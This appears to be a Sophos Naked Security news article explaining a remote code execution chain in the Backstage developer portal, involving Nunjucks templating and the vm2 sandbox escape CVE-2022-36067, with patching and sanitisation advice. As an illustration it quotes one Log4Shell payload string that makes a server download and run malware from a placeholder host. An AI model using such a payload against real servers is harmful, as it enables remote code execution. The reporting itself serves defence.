@@ -1,0 +1,38 @@
+Sophos Home protects every Mac and PC in your home 
+Researchers at cloud coding security company Oxeye have written up a critical bug that they recently discovered in the popular cloud development toolkit Backstage.
+Their report includes an explanation of how the bug works, plus proof-of-concept (PoC) code showing how to exploit it.
+Backstage is what’s known as a cloud developer portal – a sort of business logic backend that makes it easy to build web-based APIs (application programming interfaces) to allow coders inside and outside your business to interact with your online services.
+In the words of the project itself, originally created at Spotify but now open-sourced on GitHub:
+Backstage is an open platform for building developer portals. Powered by a centralized software catalog, Backstage restores order to your microservices and infrastructure and enables your product teams to ship high-quality code quickly — without compromising autonomy.
+Backstage unifies all your infrastructure tooling, services, and documentation to create a streamlined development environment from end to end.
+No, we don’t truly know what that means, either, but we do know that the toolkit is written in JavaScript, runs using the server-side JavaScript system node.js, and draws in a web of supply chain dependencies from the NPM ecosystem.
+NPM is short for Node Package Manager, an automated toolkit for ensuring that your back-end JavaScript code can easily make use of a wide range of open source libraries that provide popular, pre-written helper tools for everything from cryptography and database management to logging and version control.
+Unfortunately, the bug disclosed today, if unpatched, could give unauthenticated outsiders (loosely, anyone who can make API connections to your servers) a way to trigger remote code execution (RCE) inside the business-logic servers on your network.
+Fortunately, however, if we have interpreted Oxeye’s writeup correctly, the attack they describe for their Backstage RCE depends on a sequence of coding flaws that ultimately depend on a specific bug, designated CVE-2022-36067 in a supply-chain component that Backstage relies on called vm2.
+In case you’re wondering, vm2 is a general-purpose NPM module that implements a “virtual machine sandbox” that aims to make potentially risky JavaScript a bit safer to run on your servers.
+That CVE-2022-36067 bug in vm2 was reported back in August 2022 by Oxeye itself (who gave it a PR-friendly name of “Sandbreak”, because it broke out of the sandbox), and patched promptly by the vm2 team almost three months ago.
+So, as far as we can see, if you’re a Backstage user you will want to make sure that you have patched all at-risk components in your Backstage setup…
+…but if you patched the vm2 component that was vulnerable to Sandbreak all those months ago, then it seems you aren’t directly vulnerable to the exploit described in Oxeye’s latest disclosure.
+Also, if your Backstage servers are configured as good cybersecurity guidelines would suggest, with authentication required at both the network edge and inside the network, you won’t be at risk of random “for researcher purposes only” probes from “helpful” individuals determined to show that they are interested in cyberthreat “research”.
+Simply put, the newly disclosed security problems are the side-effect of a series of security issues, like holes in slices of Emmenthal cheese that could be permeated in sequence if an attacker is able to line up at least one hole on each slice.
+As we understand it, Backstage includes a component called Scaffolder, which, as the name suggests, helps you to manage the various addons (known as plugins) that your developer community might want or need.
+Scaffolder, in turn, makes use of a message logging system from Mozilla known as Nunjucks, which includes what’s known as string templating in node.js circles, as string interpolation in the Java world, and as string substitution to sysadmins who use command shells such as Bash.
+If string interpolation rings a bell, it’s probably because it lay at the heart of the Log4Shell vulnerability back in December 2021, and of the Follina bug in the middle of 2022.
+It’s where you get to rewrite the contents of a logging message based on special “coding characters” in a string template, so that a string such as $USER might be replaced with the account name being used by the server, or ${PID} might retrieve the current process ID.
+In the extreme case of Log4Shell, the curious looking incantation ${jndi:ldap://example.com:8888/malware} could directly trick the server into downloading a program called malware from example.com and silently running it in the background.
+In other words, you need to make absolutely certain that data arriving from an untrusted source, such as an outside user, is never passed blindly into a string templating or string interpolation function to be used as the template text itself.
+If a remote user, for instance, tries to trick your server by giving their username as ${{RISKY}} (assuming the templating library uses ${{...}} as its special marker), you need to ensure that your logging code will correctly record that naughty-looking text literally as it was received…
+…rather than allowing the text being logged to take control over the logging function itself!
+In the words of an old nursery rhyme, you need to ensure that you don’t end up singing, “There’s a hole in my ${{BUCKET}}, dear Liza, dear Liza, there’s a hole in my ${{BUCKET}}, dear Liza. A hole!”
+To be fair, the perhaps-too-powerful templating/interpolation functionality of Nunjucks is wrapped by Backstage inside yet another supply-chain component, namely the aforementioned sandboxing system vm2, which is supposed to restrict the danger that a malicious user could do with booby-trapped input data.
+Unfortunately, Oxeye researchers were able to pair their newly-discovered string templating code-triggering paths in Backstage + Scaffolder + Nunjucks with the older CVE-2022-36067 vulnerability in the vm2 security wrapper in order to achieve potential remote code execution on a Backstage server.
+If you’re a Backstage user:
+If you are a node.js/NPM user:
+If you are a programmer:
+Even when you receive input from a trusted source, there’s rarely any reason not to put it through your own sanitisation checks before you use it. 
+(You may occasionally justify an exception, for example for performance reasons, but it should be an exception, not the rule.)
+Firstly, checking again helps you spot errors that previous coders may have made in good faith; secondly, it helps to limit the spread of bad or booby-trapped data if some other part of your ecosystem gets compromised.
+The thing about those slices of Emmenthal cheese we mentioned earlier on is that although they’re permeable if at least one hole lines up on every sheet…
+…they’re impermeable if there’s at least one sheet with holes that don’t line up at all!
+Follow @NakedSecurity on Twitter for the latest computer security news.
+Follow @NakedSecurity on Instagram for exclusive pics, gifs, vids and LOLs!
